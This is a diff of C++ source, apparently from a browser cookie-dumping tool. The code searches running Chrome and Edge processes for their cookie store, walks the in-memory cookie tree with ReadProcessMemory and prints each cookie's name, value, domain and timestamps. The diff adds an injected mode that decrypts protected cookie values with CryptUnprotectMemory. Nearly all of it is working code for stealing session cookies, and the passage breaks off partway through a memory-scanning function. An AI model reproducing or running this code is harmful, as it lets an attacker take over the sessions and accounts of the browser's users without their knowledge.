@@ -7,232 +7,48 @@
 #include "Helper.h"
 #include "Memory.h"
 
-struct OptimizedString {
-    char buf[23];
-    UCHAR len;
-};
+#pragma comment(lib, "Crypt32.lib")
+void Memory::PrintAndDecrypt(BYTE* buf, DWORD dwSize, size_t origSize) {
+    if (!::CryptUnprotectMemory(buf, dwSize, CRYPTPROTECTMEMORY_SAME_PROCESS)) {
+        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to decrypt cookie value"), hOutFile);
+    }
+    else {
+        char* decrypted = (char*)malloc(origSize + 1);
+        memcpy_s(decrypted, origSize, buf, origSize);
+        *(decrypted + origSize) = '\0';
+        PRINT(hOutFile, "%s\n", decrypted);
+        free(decrypted);
+    }
+    return;
+}
 
-struct RemoteString {
-    uintptr_t dataAddress;
-    size_t strLen; //This won't include the null terminator
-    int strMax; //Maximum string length
-    char unk[3]; //I just couldn't figure out the last data type :(
-    UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
-};
-
-struct RemoteVector {
-    uintptr_t begin_;
-    uintptr_t end_;
-    uintptr_t unk; //Seems to be same as the end_ ?
-};
-
-struct ProcessBoundString {
-    RemoteVector maybe_encrypted_data_;
-    size_t original_size_;
-    BYTE unk[8]; //No clue
-    bool encrypted_ = false;
-};
-
-#pragma region Chrome
-enum class CookieSameSite {
-    UNSPECIFIED = -1,
-    NO_RESTRICTION = 0,
-    LAX_MODE = 1,
-    STRICT_MODE = 2,
-    // Reserved 3 (was EXTENDED_MODE), next number is 4.
-
-    // Keep last, used for histograms.
-    kMaxValue = STRICT_MODE
-};
-
-enum class CookieSourceScheme {
-    kUnset = 0,
-    kNonSecure = 1,
-    kSecure = 2,
-
-    kMaxValue = kSecure  // Keep as the last value.
-};
-
-enum CookiePriority {
-    COOKIE_PRIORITY_LOW = 0,
-    COOKIE_PRIORITY_MEDIUM = 1,
-    COOKIE_PRIORITY_HIGH = 2,
-    COOKIE_PRIORITY_DEFAULT = COOKIE_PRIORITY_MEDIUM
-};
-
-enum class CookieSourceType {
-    // 'unknown' is used for tests or cookies set before this field was added.
-    kUnknown = 0,
-    // 'http' is used for cookies set via HTTP Response Headers.
-    kHTTP = 1,
-    // 'script' is used for cookies set via document.cookie.
-    kScript = 2,
-    // 'other' is used for cookies set via browser login, iOS, WebView APIs,
-    // Extension APIs, or DevTools.
-    kOther = 3,
-
-    kMaxValue = kOther,  // Keep as the last value.
-};
-
-//There is now additional cookie type "CookieBase", but I'm not going to add that here yet
-struct CanonicalCookieChrome {
-    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
-    OptimizedString name;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    bool secure;
-    bool httponly;
-    CookieSameSite same_site;
-    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
-    CookieSourceScheme source_scheme;
-    int source_port;    //Not implemented //End of Net::CookieBase
-    ProcessBoundString value; //size 48
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-    CookiePriority priority;       //Not implemented
-    CookieSourceType source_type;    //Not implemented
-};
-
-#pragma endregion
-
-#pragma region Edge
-struct CanonicalCookieEdge {
-    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
-    OptimizedString name;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    bool secure;
-    bool httponly;
-    CookieSameSite same_site;
-    char partition_key[136];  //Not implemented
-    CookieSourceScheme source_scheme;
-    int source_port;    //Not implemented //End of Net::CookieBase
-    ProcessBoundString value;
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-    CookiePriority priority;       //Not implemented
-    CookieSourceType source_type;    //Not implemented
-};
-#pragma endregion
-
-#pragma region OldVersions
-struct CanonicalCookieOld {
-    OptimizedString name;
-    OptimizedString value;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-};
-
-struct CanonicalCookie124 {
-    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
-    OptimizedString name;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    bool secure;
-    bool httponly;
-    CookieSameSite same_site;
-    BYTE partition_key[120];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
-    CookieSourceScheme source_scheme;
-    int source_port;    //Not implemented //End of Net::CookieBase
-    OptimizedString value;
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-    CookiePriority priority;       //Not implemented
-    CookieSourceType source_type;    //Not implemented
-};
-
-struct CanonicalCookieChrome130 {
-    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
-    OptimizedString name;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    bool secure;
-    bool httponly;
-    CookieSameSite same_site;
-    char partition_key[128];  //Not implemented //This really should be 128 like in Edge... but for some reason it is not?
-    CookieSourceScheme source_scheme;
-    int source_port;    //Not implemented //End of Net::CookieBase
-    OptimizedString value;
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-    CookiePriority priority;       //Not implemented
-    CookieSourceType source_type;    //Not implemented
-};
-
-struct CanonicalCookieEdge130 {
-    uintptr_t _vfptr; //CanonicalCookie Virtual Function table address. This could also be used to scrape all cookies as it is backed by the chrome.dll
-    OptimizedString name;
-    OptimizedString domain;
-    OptimizedString path;
-    int64_t creation_date;
-    bool secure;
-    bool httponly;
-    CookieSameSite same_site;
-    char partition_key[136];  //Not implemented
-    CookieSourceScheme source_scheme;
-    int source_port;    //Not implemented //End of Net::CookieBase
-    OptimizedString value;
-    int64_t expiry_date;
-    int64_t last_access_date;
-    int64_t last_update_date;
-    CookiePriority priority;       //Not implemented
-    CookieSourceType source_type;    //Not implemented
-};
-#pragma endregion
-
-
-struct Node {
-    uintptr_t left;
-    uintptr_t right;
-    uintptr_t parent;
-    bool is_black; //My guess is that data is stored in red-black tree
-    char padding[7];
-    OptimizedString key;
-    uintptr_t valueAddress;
-};
-
-struct RootNode {
-    uintptr_t beginNode;
-    uintptr_t firstNode;
-    size_t size;
-};
-
-void ReadVector(HANDLE hProcess, RemoteVector vector, DWORD origSize) {
+void Memory::ReadVector(RemoteVector vector, size_t origSize) {
     size_t szSize = vector.end_ - vector.begin_;
     if (szSize <= 0) {
         //Some cookies just are like that. tapad.com cookie: TapAd_3WAY_SYNCS for example is buggy even with browser tools
-        printf("[-] Invalid value length\n"); 
+        PRINT(hOutFile, "[-] Invalid value length\n");
         return;
     }
 
     BYTE* buf = (BYTE*)malloc(szSize+1); //+1 for the string termination
     if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(vector.begin_), buf, szSize, nullptr)) {
-        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read encrypted cookie value"));
+        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read encrypted cookie value"), hOutFile);
         free(buf);
         return;
     }
-
-    memcpy_s(buf + szSize, 1, "\0", 1);
-    PRINT("%s\n", buf);
+    if (this->injected)
+        PrintAndDecrypt(buf, szSize, origSize);
+    else {
+        memcpy_s(buf + szSize, 1, "\0", 1);
+        PRINT(hOutFile, "%s\n", buf);
+    }
 
     free(buf);
 }
 
 //Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
 //Or if it is stored in another address
-void ReadString(HANDLE hProcess, OptimizedString string) {
+void Memory::ReadString(OptimizedString string) {
     if (string.len > 23)
     {
         RemoteString longString = { 0 };
@@ -240,24 +56,24 @@ void ReadString(HANDLE hProcess, OptimizedString string) {
 
         if (longString.dataAddress != 0) {
 #ifdef _DEBUG
-            PRINT("Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
+            PRINT(hOutFile, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
 #endif
             unsigned char* buf = (unsigned char*)malloc(longString.strMax);
             if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
-                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read cookie value"));
+                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read cookie value"), hOutFile);
                 free(buf);
                 return;
             }
-            PRINT("%s\n", buf);
+            PRINT(hOutFile, "%s\n", buf);
             free(buf);
         }
     }
     else
-        PRINT("%s\n", string.buf);
+        PRINT(hOutFile, "%s\n", string.buf);
 
 }
 
-void PrintTimeStamp(int64_t timeStamp) {
+void Memory::PrintTimeStamp(int64_t timeStamp) {
     ULONGLONG fileTimeTicks = timeStamp * 10;
 
     FILETIME fileTime;
@@ -267,265 +83,265 @@ void PrintTimeStamp(int64_t timeStamp) {
     SYSTEMTIME systemTime;
     FileTimeToSystemTime(&fileTime, &systemTime);
 
-    PRINT("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
+    PRINT(hOutFile, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
         systemTime.wYear, systemTime.wMonth, systemTime.wDay,
         systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
 }
 
-void PrintValuesEdge(CanonicalCookieEdge130 cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadString(hProcess, cookie.value);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
-    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
-    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+void Memory::PrintValuesEdge(CanonicalCookieEdge130 cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadString(cookie.value);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
+    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void PrintValuesEdge(CanonicalCookieEdge cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
-    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
-    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+void Memory::PrintValuesEdge(CanonicalCookieEdge cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadVector(cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
+    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void PrintValuesChrome(CanonicalCookieChrome cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadVector(hProcess, cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
-    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
-    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+void Memory::PrintValuesChrome(CanonicalCookieChrome cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadVector(cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
+    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void PrintValuesChrome(CanonicalCookieChrome130 cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadString(hProcess, cookie.value);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
-    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
-    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+void Memory::PrintValuesChrome(CanonicalCookieChrome130 cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadString(cookie.value);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
+    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void PrintValuesChrome(CanonicalCookie124 cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadString(hProcess, cookie.value);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
-    PRINT("    Secure: %s\n", cookie.secure ? "True" : "False");
-    PRINT("    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
+void Memory::PrintValuesChrome(CanonicalCookie124 cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadString(cookie.value);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
+    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
+    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void PrintValuesOld(CanonicalCookieOld cookie, HANDLE hProcess) {
-    PRINT("    Name: ");
-    ReadString(hProcess, cookie.name);
-    PRINT("    Value: ");
-    ReadString(hProcess, cookie.value);
-    PRINT("    Domain: ");
-    ReadString(hProcess, cookie.domain);
-    PRINT("    Path: ");
-    ReadString(hProcess, cookie.path);
-    PRINT("    Creation time: ");
-    PrintTimeStamp(cookie.creation_date);
-    PRINT("    Expiration time: ");
-    PrintTimeStamp(cookie.expiry_date);
-    PRINT("    Last accessed: ");
-    PrintTimeStamp(cookie.last_access_date);
-    PRINT("    Last updated: ");
-    PrintTimeStamp(cookie.last_update_date);
+void Memory::PrintValuesOld(CanonicalCookieOld cookie) {
+    PRINT(hOutFile, "    Name: ");
+    Memory::ReadString(cookie.name);
+    PRINT(hOutFile, "    Value: ");
+    Memory::ReadString(cookie.value);
+    PRINT(hOutFile, "    Domain: ");
+    Memory::ReadString(cookie.domain);
+    PRINT(hOutFile, "    Path: ");
+    Memory::ReadString(cookie.path);
+    PRINT(hOutFile, "    Creation time: ");
+    Memory::PrintTimeStamp(cookie.creation_date);
+    PRINT(hOutFile, "    Expiration time: ");
+    Memory::PrintTimeStamp(cookie.expiry_date);
+    PRINT(hOutFile, "    Last accessed: ");
+    Memory::PrintTimeStamp(cookie.last_access_date);
+    PRINT(hOutFile, "    Last updated: ");
+    Memory::PrintTimeStamp(cookie.last_update_date);
 
-    PRINT("\n");
+    PRINT(hOutFile, "\n");
 }
 
-void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion targetConfig) {
+void Memory::ProcessNodeValue(uintptr_t Valueaddr) {
 
     if (targetConfig == Chrome) {
         CanonicalCookieChrome cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesChrome(cookie, hProcess);
+        Memory::PrintValuesChrome(cookie);
 
     }
     else if (targetConfig == Edge) {
         CanonicalCookieEdge cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesEdge(cookie, hProcess);
+        Memory::PrintValuesEdge(cookie);
     }
     else if (targetConfig == Edge130) {
         CanonicalCookieEdge130 cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge130), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesEdge(cookie, hProcess);
+        Memory::PrintValuesEdge(cookie);
     }
     else if (targetConfig == OldChrome) {
         CanonicalCookieOld cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieOld), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesOld(cookie, hProcess);
+        Memory::PrintValuesOld(cookie);
     }
     else if (targetConfig == Chrome124) {
         CanonicalCookie124 cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie124), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesChrome(cookie, hProcess);
+        Memory::PrintValuesChrome(cookie);
     }
     else if (targetConfig == Chrome130) {
         CanonicalCookieChrome130 cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome130), nullptr)) {
-            PrintErrorWithMessage(TEXT("Failed to read cookie struct"));
+            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
             return;
         }
-        PrintValuesChrome(cookie, hProcess);
+        Memory::PrintValuesChrome(cookie);
     }
     else {
-        PRINT("[-] Could not read cookie values: Unknown configuration %d", targetConfig);
+        PRINT(hOutFile, "[-] Could not read cookie values: Unknown configuration %d", targetConfig);
     }
 
 }
 
-void ProcessNode(HANDLE hProcess, const Node& node, TargetVersion targetConfig) {
+void Memory::ProcessNode(const Node& node) {
     // Process the current node
-    PRINT("Cookie Key: ");
-    ReadString(hProcess, node.key);
+    PRINT(hOutFile, "Cookie Key: ");
+    Memory::ReadString(node.key);
 
 #ifdef _DEBUG
-    PRINT("Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
+    PRINT(hOutFile, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-    ProcessNodeValue(hProcess, node.valueAddress, targetConfig);
+    Memory::ProcessNodeValue(node.valueAddress);
 
     // Process the left child if it exists
     if (node.left != 0) {
         Node leftNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, leftNode, targetConfig);
+            Memory::ProcessNode(leftNode);
         else
-            PrintErrorWithMessage(TEXT("Error reading left node"));
+            PrintErrorWithMessage(TEXT("Error reading left node"), this->hOutFile);
     }
 
     // Process the right child if it exists
     if (node.right != 0) {
         Node rightNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
-            ProcessNode(hProcess, rightNode, targetConfig);
+            Memory::ProcessNode(rightNode);
         else
-            PrintErrorWithMessage(TEXT("Error reading right node"));
+            PrintErrorWithMessage(TEXT("Error reading right node"), this->hOutFile);
     }
 }
 
-void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, TargetVersion targetConfig) {
+void Memory::WalkCookieMap(uintptr_t cookieMapAddress) {
 
     RootNode cookieMap;
     if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
-        PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"));
+        PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"), this->hOutFile);
         return;
     }
 
     // Process the root node
 #ifdef _DEBUG
-    PRINT("Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
-    PRINT("Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
-    PRINT("Size of the cookie map: %Iu\n", cookieMap.size);
+    PRINT(hOutFile, "Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
+    PRINT(hOutFile, "Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
+    PRINT(hOutFile, "Size of the cookie map: %Iu\n", cookieMap.size);
 #endif // _DEBUG
 
-    PRINT("[*] Number of available cookies: %Iu\n", cookieMap.size);
+    PRINT(hOutFile, "[*] Number of available cookies: %Iu\n", cookieMap.size);
 
     if (cookieMap.firstNode == 0 || cookieMap.size == 0) //CookieMap was empty
     {
-        PRINT("[*] This Cookie map was empty\n");
+        PRINT(hOutFile, "[*] This Cookie map was empty\n");
         return;
     }
 
     // Process the first node in the binary search tree
     Node firstNode;
     if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
-        ProcessNode(hProcess, firstNode, targetConfig);
+        Memory::ProcessNode(firstNode);
     else
-        PrintErrorWithMessage(TEXT("Error reading first node\n"));
+        PrintErrorWithMessage(TEXT("Error reading first node\n"), this->hOutFile);
 }
 
-BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
+BOOL Memory::MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
 
     for (size_t i = 0; i < num; ++i) {
         if (searchPattern[i] == 0xAA)
@@ -538,7 +354,7 @@ BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
     return TRUE;
 }
 
-void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
+void Memory::PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
     size_t szAddr = sizeof(uintptr_t) - 1;
     for (offset -= 1; szAddr > 3; offset--) {
         pattern[offset] = baseAddrPattern[szAddr];
@@ -546,7 +362,7 @@ void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
     }
 }
 
-BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {
+BYTE* Memory::PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {
 
     //Copy the pattern
     BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
@@ -568,7 +384,7 @@ BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAd
     return newPattern;
 }
 
-BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {
+BOOL Memory::FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {
 
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
@@ -584,7 +400,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
                 BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                 SIZE_T bytesRead;
 
-                BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));
+                BYTE* newPattern = Memory::PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));
 
                 //Error code 299
                 //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
@@ -596,7 +412,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
                             uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                             uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
 #ifdef _DEBUG
-                            PRINT("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
+                            PRINT(hOutFile, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                 memoryInfo.AllocationBase,
                                 memoryInfo.BaseAddress,
                                 offset);
@@ -622,7 +438,7 @@ BOOL FindPattern(HANDLE hProcess, const BYTE* pattern, size_t patternSize, uintp
             startAddress += memoryInfo.RegionSize;
         }
         else {
-            DEBUG_PRINT_ERROR_MESSAGE(TEXT("VirtualQueryEx failed\n"));
